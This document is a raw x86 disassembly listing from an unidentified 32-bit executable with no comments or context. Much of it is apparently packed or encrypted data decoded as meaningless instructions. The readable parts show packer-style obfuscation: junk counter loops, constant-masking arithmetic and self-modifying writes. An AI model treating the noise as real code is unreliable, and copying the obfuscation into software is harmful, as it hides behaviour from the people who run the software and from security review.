  407c7a:	xor    DWORD PTR [edx-0x3a47ab99],ecx
  407c80:	lahf   
  407c81:	or     al,0x99
  407c83:	div    DWORD PTR [ecx-0x83590c0]
  407c89:	sbb    ch,BYTE PTR [ebx-0x48]
  407c8c:	sub    DWORD PTR [ebx+edx*2],0xeaa6671c
  407c93:	jo     0x407c7e
  407c95:	scas   eax,DWORD PTR es:[edi]
  407c96:	xchg   ebp,eax
  407c97:	test   eax,0x568a2c44
  407c9c:	pop    ds
  407c9d:	lock nop
  407c9f:	push   0x7a274733
  407ca4:	mov    edx,0xb012ccd3
  407ca9:	jno    0x407cf4
  407cab:	pop    esi
  407cac:	iret   
  407cad:	ret    
  407cae:	inc    esi
  407caf:	inc    ebx
  407cb0:	adc    al,0xf9
  407cb2:	jp     0x407c60
  407cb4:	or     al,0x2a
  407cb6:	lahf   
  407cb7:	jmp    0xb12a:0x872e0c3c
  407cbe:	jl     0x407cbe
  407cc0:	jl     0x407cdd
  407cc2:	dec    eax
  407cc3:	std    
  407cc4:	push   ss
  407cc5:	or     al,0xc0
  407cc7:	and    al,0x5b
  407cc9:	lods   eax,DWORD PTR ds:[esi]
  407cca:	das    
  407ccb:	aad    0x81
  407ccd:	sub    ah,bl
  407ccf:	xor    eax,0xa829fc68
  407cd4:	je     0x407d40
  407cd6:	mov    al,ds:0x7a612c2c
  407cdb:	adc    al,BYTE PTR [eax]
  407cdd:	or     bh,cl
  407cdf:	xor    cl,BYTE PTR [edx+esi*1-0x1d735dc5]
  407ce6:	sbb    bh,BYTE PTR [esi]
  407ce8:	jnp    0x407d26
  407cea:	xchg   ebp,eax
  407ceb:	mov    al,ds:0x957dd3a7
  407cf0:	xlat   BYTE PTR cs:[ebx]
  407cf2:	ins    BYTE PTR es:[edi],dx
  407cf3:	inc    eax
  407cf4:	(bad)  ds:0xf207222b
  407cfa:	mov    ah,0x90
  407cfc:	jb     0x407c9b
  407cfe:	cdq    
  407cff:	stos   BYTE PTR es:[edi],al
  407d00:	pop    eax
  407d01:	mov    esi,?
  407d03:	stc    
  407d04:	mov    esi,0x398234b5
  407d09:	popa   
  407d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d0b:	scas   al,BYTE PTR es:[edi]
  407d0c:	mov    ah,0x53
  407d0e:	push   ecx
  407d0f:	idiv   cl
  407d11:	mov    eax,0x8fdc9e79
  407d16:	inc    esi
  407d17:	std    
  407d18:	out    dx,al
  407d19:	dec    edx
  407d1a:	push   cs
  407d1b:	ja     0x407cb6
  407d1d:	xlat   BYTE PTR ds:[ebx]
  407d1e:	clc    
  407d1f:	cwde   
  407d20:	das    
  407d21:	pusha  
  407d22:	dec    esi
  407d23:	add    DWORD PTR [esi],eax
  407d25:	mov    dl,0x31
  407d27:	pushf  
  407d28:	xchg   DWORD PTR [ebx+0x38ddc95a],ebx
  407d2e:	push   edx
  407d2f:	push   0x12a0e378
  407d34:	push   esi
  407d35:	sbb    esp,DWORD PTR [edx-0x2bad7a10]
  407d3b:	adc    esi,esp
  407d3d:	loopne 0x407d8e
  407d3f:	sub    edx,edx
  407d41:	(bad)  
  407d42:	sub    eax,0xb0c56a96
  407d47:	or     al,0xe8
  407d49:	mov    esp,0x4de55f1
  407d4e:	and    BYTE PTR [edx],dl
  407d50:	add    bh,ah
  407d52:	ins    BYTE PTR es:[edi],dx
  407d53:	inc    ebp
  407d54:	xchg   DWORD PTR cs:0x3226481a,ecx
  407d5b:	dec    ebx
  407d5c:	in     al,0xd2
  407d5e:	and    BYTE PTR [edx],bh
  407d60:	lods   al,BYTE PTR ds:[esi]
  407d61:	mov    al,0xab
  407d63:	xchg   edi,eax
  407d64:	jp     0x407d6e
  407d66:	data16 cmp bl,BYTE PTR ds:0x2b1a75b6
  407d6d:	lahf   
  407d6e:	xchg   BYTE PTR [esp+ebp*1-0x54],ah
  407d72:	icebp  
  407d73:	dec    ecx
  407d74:	dec    edx
  407d75:	cmp    eax,0x89e941bf
  407d7a:	xchg   ecx,eax
  407d7b:	aas    
  407d7c:	adc    bh,BYTE PTR [edx-0x75]
  407d7f:	add    BYTE PTR [eax-0x2b],al
  407d82:	pop    es
  407d83:	push   0x10
  407d85:	ror    dh,cl
  407d87:	xor    eax,0xcc109279
  407d8c:	jo     0x407d6d
  407d8e:	xor    DWORD PTR ds:0x9818b704,0xffffff92
  407d95:	inc    eax
  407d96:	xor    bl,BYTE PTR [edi]
  407d98:	ss pop ebp
  407d9a:	out    0x1c,eax
  407d9c:	inc    ecx
  407d9d:	fisubr DWORD PTR fs:[ebx-0x33211bd8]
  407da4:	cld    
  407da5:	add    eax,DWORD PTR [ebp-0x2]
  407da8:	stc    
  407da9:	es retf 0xda07
  407dad:	loop   0x407dd1
  407daf:	cmp    al,0x25
  407db1:	inc    eax
  407db2:	outs   dx,DWORD PTR ds:[esi]
  407db3:	pop    edi
  407db4:	idiv   BYTE PTR [ebx+0x2f]
  407db7:	rcr    DWORD PTR ss:[ebx],1
  407dba:	or     cl,BYTE PTR [eax-0x52fb6fc8]
  407dc0:	pop    esp
  407dc1:	(bad)  
  407dc2:	mov    dh,0x89
  407dc4:	loope  0x407d9a
  407dc6:	mov    bl,0x84
  407dc8:	adc    eax,0xc547103d
  407dcd:	sahf   
  407dce:	out    0xe2,al
  407dd0:	aaa    
  407dd1:	int3   
  407dd2:	cmp    BYTE PTR [ebp-0x3c],cl
  407dd5:	xchg   esp,eax
  407dd6:	adc    al,0x4e
  407dd8:	push   esp
  407dd9:	add    bl,BYTE PTR ds:0xc7362e3b
  407ddf:	aaa    
  407de0:	sub    eax,0xa9f9b31a
  407de5:	mov    ebp,0xfe571091
  407dea:	dec    edx
  407deb:	fmul   DWORD PTR [edx+0x4b75d268]
  407df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407df2:	pop    es
  407df3:	xlat   BYTE PTR ds:[ebx]
  407df4:	xchg   esp,eax
  407df5:	xchg   esi,eax
  407df6:	(bad)  
  407df7:	out    dx,al
  407df8:	ss sbb eax,0xc92d7b49
  407dfe:	repz jo 0x407dc9
  407e01:	pop    ds
  407e02:	(bad)  
  407e03:	inc    edi
  407e04:	pop    ds
  407e05:	or     al,0xcb
  407e07:	repz sbb eax,0x9b60f098
  407e0d:	pusha  
  407e0e:	test   al,0x7c
  407e10:	mov    bl,0x1d
  407e12:	add    al,0x8c
  407e14:	cdq    
  407e15:	sbb    bl,BYTE PTR [esp+ebx*8+0x4a]
  407e19:	mov    al,BYTE PTR ds:0x6f1ccfac
  407e1f:	repnz pop edi
  407e21:	push   cs
  407e22:	(bad)  
  407e23:	sbb    bl,ch
  407e25:	mov    BYTE PTR [edi+eax*8],bh
  407e28:	and    eax,0x63c512f1
  407e2d:	aas    
  407e2e:	cmp    al,al
  407e30:	lock and al,0x98
  407e33:	pop    esi
  407e34:	add    dh,BYTE PTR [ecx]
  407e36:	mov    dl,0x2a
  407e38:	jge    0x407de8
  407e3a:	pop    esi
  407e3b:	dec    esi
  407e3c:	sub    eax,0x29b76c4
  407e41:	jp     0x407e47
  407e43:	ja     0x407ddb
  407e45:	mov    bl,0x65
  407e47:	jbe    0x407e8d
  407e49:	inc    dl
  407e4b:	xchg   ecx,eax
  407e4c:	iret   
  407e4d:	(bad)  
  407e4e:	out    dx,eax
  407e4f:	popf   
  407e50:	xor    al,BYTE PTR [ecx]
  407e52:	js     0x407e4b
  407e54:	dec    esi
  407e55:	sub    eax,0x4cbb0cd
  407e5a:	inc    esp
  407e5b:	lock test DWORD PTR [ebx+esi*1],0x1089c8bb
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x56a7c70d
  408191:	sub    DWORD PTR [esi],edi
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	loopne 0x408159
  40819c:	pop    ecx
  40819d:	addr16 mov ah,0x4b
  4081a0:	inc    edi
  4081a1:	sbb    eax,0xbd44f9c4
  4081a6:	daa    
  4081a7:	(bad)  
  4081a8:	xchg   ebx,eax
  4081a9:	and    DWORD PTR [edx-0x52ba741c],ebx
  4081af:	das    
  4081b0:	js     0x408220
  4081b2:	ret    
  4081b3:	jle    0x408148
  4081b5:	enter  0x30e3,0xc2
  4081b9:	imul   edx,DWORD PTR es:[ebp+0x13],0x33
  4081be:	adc    dh,cl
  4081c0:	pop    esp
  4081c1:	dec    ecx
  4081c2:	hlt    
  4081c3:	test   eax,0xc8a71c98
  4081c8:	cmp    ebp,ebx
  4081ca:	fstp   DWORD PTR [ecx-0x75]
  4081cd:	pop    ds
  4081ce:	int3   
  4081cf:	sub    BYTE PTR [ecx+0x48e47a3],dh
  4081d5:	jo     0x40816e
  4081d7:	test   bl,dl
  4081d9:	frstor [ecx]
  4081db:	ins    DWORD PTR es:[edi],dx
  4081dc:	imul   ebx,DWORD PTR ds:0x5decbdac,0xa50cb6fd
  4081e6:	and    ecx,DWORD PTR [eax+0xb]
  4081e9:	cmp    BYTE PTR [ebx],dl
  4081eb:	retf   
  4081ec:	out    dx,eax
  4081ed:	fwait
  4081ee:	mov    eax,0x3366a9a7
  4081f3:	sti    
  4081f4:	out    dx,al
  4081f5:	xchg   DWORD PTR [ecx-0x19],edx
  4081f8:	out    dx,al
  4081f9:	or     edx,DWORD PTR [edi+esi*4-0xa]
  4081fd:	aad    0xae
  4081ff:	cs xchg ebp,eax
  408201:	mov    dh,0xab
  408203:	pop    ss
  408204:	cli    
  408205:	pushf  
  408206:	pop    edi
  408207:	imul   DWORD PTR [edi+0x3c]
  40820a:	sbb    DWORD PTR [edx-0x316a5ad1],edi
  408210:	js     0x4081bc
  408212:	imul   eax,DWORD PTR [eax+0x1a],0xbffd197f
  408219:	xchg   ebx,eax
  40821a:	xchg   BYTE PTR [edi+0x3ac44044],bl
  408220:	repz push ebp
  408222:	aas    
  408223:	fimul  DWORD PTR [eax-0x2f4a08ad]
  408229:	xchg   BYTE PTR [eax-0x89cb8f7],al
  40822f:	cli    
  408230:	in     al,dx
  408231:	mov    dh,0x1d
  408233:	das    
  408234:	mov    al,0xd2
  408236:	outs   dx,BYTE PTR ds:[esi]
  408237:	shl    BYTE PTR [edx+0x1d98f064],cl
  40823d:	div    DWORD PTR ds:0x70074ece
  408243:	cmp    BYTE PTR [ebx-0x64],al
  408246:	sub    ah,BYTE PTR [ecx]
  408248:	mov    ah,0x31
  40824a:	add    ecx,DWORD PTR ds:0x4fb15ab8
  408250:	sub    eax,0x99335ac9
  408256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408257:	ins    DWORD PTR es:[edi],dx
  408258:	push   0xffffffe8
  40825a:	jbe    0x40828e
  40825c:	stc    
  40825d:	and    eax,0x2ea715b3
  408262:	stc    
  408263:	call   0x2cd4c9cf
  408268:	sahf   
  408269:	shr    BYTE PTR [edx+0x3a],1
  40826c:	cmp    BYTE PTR [edi],dh
  40826e:	mov    bh,0xda
  408270:	loop   0x408220
  408272:	cmp    DWORD PTR ds:0xd89a98e,ecx
  408278:	mul    DWORD PTR [esp+eiz*8+0x5f463fa9]
  40827f:	scas   al,BYTE PTR es:[edi]
  408280:	(bad)  
  408281:	popa   
  408282:	stc    
  408283:	mov    WORD PTR [esi],?
  408285:	push   edi
  408286:	je     0x408238
  408288:	add    edi,DWORD PTR [ebp-0x2]
  40828b:	into   
  40828c:	(bad)  
  40828d:	rol    BYTE PTR [edx-0x343a2990],cl
  408293:	fist   WORD PTR [edx-0x4a]
  408296:	test   eax,0x39616083
  40829b:	lahf   
  40829c:	push   esp
  40829d:	pop    ebx
  40829e:	nop
  40829f:	cmp    DWORD PTR [edi],ecx
  4082a1:	xchg   esp,eax
  4082a2:	fsub   QWORD PTR [eax-0x11]
  4082a5:	and    BYTE PTR [ecx+0xf],ch
  4082a8:	out    dx,al
  4082a9:	out    dx,eax
  4082aa:	aaa    
  4082ab:	arpl   WORD PTR [edi-0x2a88a79d],bp
  4082b1:	call   0xb992:0xa40eb9e4
  4082b8:	lock xlat BYTE PTR ds:[ebx]
  4082ba:	cmp    ebp,0x27054022
  4082c0:	push   cs
  4082c1:	loope  0x4082e2
  4082c3:	je     0x408328
  4082c5:	dec    esp
  4082c6:	dec    ebx
  4082c7:	clc    
  4082c8:	dec    edi
  4082c9:	jne    0x408296
  4082cb:	jae    0x4082b4
  4082cd:	jae    0x408264
  4082cf:	cdq    
  4082d0:	(bad)  
  4082d2:	imul   ecx,DWORD PTR [esi+0x1a9739a1],0x2e5b0e78
  4082dc:	inc    al
  4082de:	rcr    dh,cl
  4082e0:	and    al,0x9c
  4082e2:	jae    0x408297
  4082e4:	jl     0x40828d
  4082e6:	outs   dx,DWORD PTR ds:[esi]
  4082e7:	add    DWORD PTR [edi+eax*8],esp
  4082ea:	push   ecx
  4082eb:	jl     0x40833d
  4082ed:	cmp    eax,0x1f98bba7
  4082f2:	push   es
  4082f3:	sub    ebx,DWORD PTR [ecx-0x3aad556d]
  4082f9:	ret    
  4082fa:	inc    ebp
  4082fb:	daa    
  4082fc:	adc    esi,ecx
  4082fe:	imul   esi,DWORD PTR [ebx],0x61
  408301:	aas    
  408302:	or     DWORD PTR [edx],eax
  408304:	ins    BYTE PTR es:[edi],dx
  408305:	cmp    eax,0xa1dc8c0f
  40830a:	jge    0x4082c8
  40830c:	into   
  40830d:	les    eax,FWORD PTR [edx+0x6b7b2bda]
  408313:	push   eax
  408314:	fwait
  408315:	sub    al,0x31
  408317:	sbb    BYTE PTR [eax+0x20],ch
  40831a:	test   BYTE PTR [ebp-0x80],bl
  40831d:	mov    WORD PTR [ecx],gs
  40831f:	xchg   ecx,eax
  408320:	(bad)  
  408321:	test   al,0xb4
  408323:	sbb    DWORD PTR [edi-0x131a40ef],eax
  408329:	adc    al,0xb9
  40832b:	inc    esi
  40832c:	dec    ecx
  40832d:	cmp    eax,0x3d6abb54
  408332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408333:	fisub  DWORD PTR [esp+eax*2]
  408336:	loope  0x4083a6
  408338:	not    DWORD PTR [ebx+0x10]
  40833b:	adc    BYTE PTR [eax+esi*1],dl
  40833e:	xchg   ebp,eax
  40833f:	inc    esp
  408340:	jo     0x408307
  408342:	xor    DWORD PTR [ecx+0x68264379],edi
  408348:	xchg   ecx,eax
  408349:	sub    eax,0x36a468af
  40834e:	out    dx,al
  40834f:	scas   al,BYTE PTR es:[edi]
  408350:	je     0x4082ea
  408352:	popa   
  408353:	pop    edx
  408354:	test   BYTE PTR [ebx],dl
  408356:	and    BYTE PTR [edx+0x5b],0x28
  40835a:	or     DWORD PTR [edi-0x69],esi
  40835d:	test   eax,0x3249eff3
  408362:	or     eax,0xe9f8627e
  408367:	inc    esi
  408368:	sub    esi,edx
  40836a:	clc    
  40836b:	add    edx,DWORD PTR fs:[ebp-0x4791c175]
  408372:	xchg   esi,eax
  408373:	popa   
  408374:	gs mov esp,0x552fccf1
  40837a:	mov    al,0x62
  40837c:	adc    esi,ecx
  40837e:	push   ss
  40837f:	mov    ds:0x149eb6a7,eax
  408384:	pop    ecx
  408385:	push   0x8f5ad61b
  40838a:	sub    dl,BYTE PTR [ebp-0x3945c82c]
  408390:	lahf   
  408391:	and    BYTE PTR [eax],ch
  408393:	cmp    edx,DWORD PTR [ebx+0x74]
  408396:	dec    esp
  408397:	test   DWORD PTR [ebp+0x2404a9b8],0x1461525
  4083a1:	jmp    0x84ed:0x833b970a
  4083a8:	mov    esi,0x59894aae
  4083ad:	push   0x39
  4083af:	mov    BYTE PTR [eax-0x7ed1bca0],al
  4083b5:	fnstenv [eax-0x1b]
  4083b8:	fldenv [ebx+0x119325f4]
  4083be:	push   0xffffff9e
  4083c0:	sub    eax,0x8979c577
  4083c5:	inc    ebp
  4083c6:	loopne 0x408349
  4083c8:	and    eax,0x43365b
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	dec    edx
  408465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408466:	mov    bh,al
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	clc    
  408471:	aas    
  408472:	and    al,0xce
  408474:	mov    edi,0xda806c93
  408479:	push   ds
  40847a:	push   ebp
  40847b:	daa    
  40847c:	fdiv   DWORD PTR [esp+eax*2-0x22]
  408480:	aas    
  408481:	dec    edx
  408482:	push   esp
  408483:	mov    ah,0x5e
  408485:	mov    edx,0x45aa2204
  40848a:	sub    edx,esp
  40848c:	mov    al,0x23
  40848e:	cmc    
  40848f:	ja     0x4084da
  408491:	mov    cl,0x59
  408493:	sbb    BYTE PTR [edi],ah
  408495:	mov    esi,0x3f6459ca
  40849a:	xor    bl,BYTE PTR [eax-0x733209a1]
  4084a0:	imul   ecx,DWORD PTR [edi+edx*8+0x7d081db],0x1f
  4084a8:	sti    
  4084a9:	push   0x5be57569
  4084ae:	pop    edx
  4084af:	lods   eax,DWORD PTR ds:[esi]
  4084b0:	push   ss
  4084b1:	ficom  WORD PTR [ecx]
  4084b3:	push   0xeb9e9bb2
  4084b8:	jnp    0x40849a
  4084ba:	fdiv   st(3),st
  4084bc:	ror    eax,1
  4084be:	repz jnp 0x4084d5
  4084c1:	in     al,0xfa
  4084c3:	sub    DWORD PTR [eax+ebx*8+0x75e05379],0x6d750f90
  4084ce:	pop    es
  4084cf:	call   0x69c6f796
  4084d4:	out    dx,al
  4084d5:	shl    BYTE PTR [ebp-0x644c9687],cl
  4084db:	mov    al,ds:0xc88945f6
  4084e0:	push   ebp
  4084e1:	inc    eax
  4084e2:	mov    ds:0xff41f8e,eax
  4084e7:	(bad)
  4084eb:	pop    ebp
  4084ec:	aam    0x2e
  4084ee:	pop    edx
  4084ef:	sub    edi,DWORD PTR [edx-0x6ef42308]
  4084f5:	sbb    ah,BYTE PTR ds:0x683f910f
  4084fb:	xchg   esi,eax
  4084fc:	cmc    
  4084fd:	fsin   
  4084ff:	das    
  408500:	pop    ecx
  408501:	inc    esp
  408502:	imul   edi,DWORD PTR [esi+ecx*8+0x3b826496],0xf
  40850a:	pop    edi
  40850b:	or     BYTE PTR [esp+esi*8-0x4e],dh
  40850f:	jnp    0x4084c7
  408511:	call   0xf722d8b4
  408516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408517:	shl    DWORD PTR [eax-0x308c99db],1
  40851d:	shr    BYTE PTR [ebx+esi*4],cl
  408520:	jmp    0x2747:0xdb3f6471
  408527:	mov    dh,0xb6
  408529:	push   cs
  40852a:	pop    es
  40852b:	cmp    ch,BYTE PTR [eax+0x5b]
  40852e:	daa    
  40852f:	int3   
  408530:	add    eax,0xa70b6fbe
  408535:	dec    esp
  408536:	pop    edi
  408537:	pushf  
  408538:	inc    edx
  408539:	xor    cl,BYTE PTR [ebx+esi*4-0x1b158198]
  408540:	cmp    ah,cl
  408542:	sub    ah,cl
  408544:	ret    
  408545:	jecxz  0x408561
  408547:	std    
  408548:	arpl   bp,bx
  40854a:	mov    WORD PTR [ecx-0x6d],fs
  40854d:	push   esp
  40854e:	lahf   
  40854f:	stos   BYTE PTR es:[edi],al
  408550:	rol    BYTE PTR [eax+0x38],cl
  408553:	fwait
  408554:	dec    ebx
  408555:	(bad)  
  408557:	dec    esp
  408558:	pop    esi
  408559:	mov    ds:0x8979f350,al
  40855e:	int3   
  40855f:	retf   0x17d1
  408562:	icebp  
  408563:	call   0xa8f7:0xf09f6566
  40856a:	sbb    DWORD PTR [ebp+0x4868ef91],ebp
  408570:	add    BYTE PTR ds:0x5386e71,dl
  408576:	mov    bl,BYTE PTR [ecx+esi*1]
  408579:	(bad)  
  40857b:	xchg   edx,eax
  40857c:	add    BYTE PTR [esi+0x5f02a68],cl
  408582:	push   ecx
  408583:	dec    ebp
  408584:	cli    
  408585:	lahf   
  408586:	mov    ebx,0xbd2b695b
  40858b:	xor    al,0x2d
  40858d:	lods   al,BYTE PTR ds:[esi]
  40858e:	das    
  40858f:	or     al,0xb2
  408591:	test   eax,0x526f405c
  408596:	ins    DWORD PTR es:[edi],dx
  408597:	rcl    ah,1
  408599:	test   DWORD PTR [eax+0x2242c50c],eax
  40859f:	pop    eax
